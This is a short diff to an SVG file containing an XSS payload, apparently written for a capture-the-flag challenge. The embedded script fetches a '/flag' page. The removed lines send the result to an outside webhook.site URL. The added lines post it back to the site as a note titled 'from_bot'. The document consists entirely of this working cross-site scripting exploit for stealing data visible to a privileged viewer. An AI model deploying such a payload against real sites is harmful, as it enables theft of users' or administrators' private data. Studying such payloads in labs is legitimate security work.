@@ -1,8 +1,15 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    console.log('XSS triggered');
     fetch('/flag')
       .then(r => r.text())
-      .then(f => fetch('https://webhook.site/f6c3e79a-49e9-40c2-83bd-58943012dab8?flag=' + encodeURIComponent(f)));
+      .then(flag => {
+        fetch('/', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: 'title=from_bot&md=' + encodeURIComponent(flag)
+        });
+      });
   </script>
 </svg>
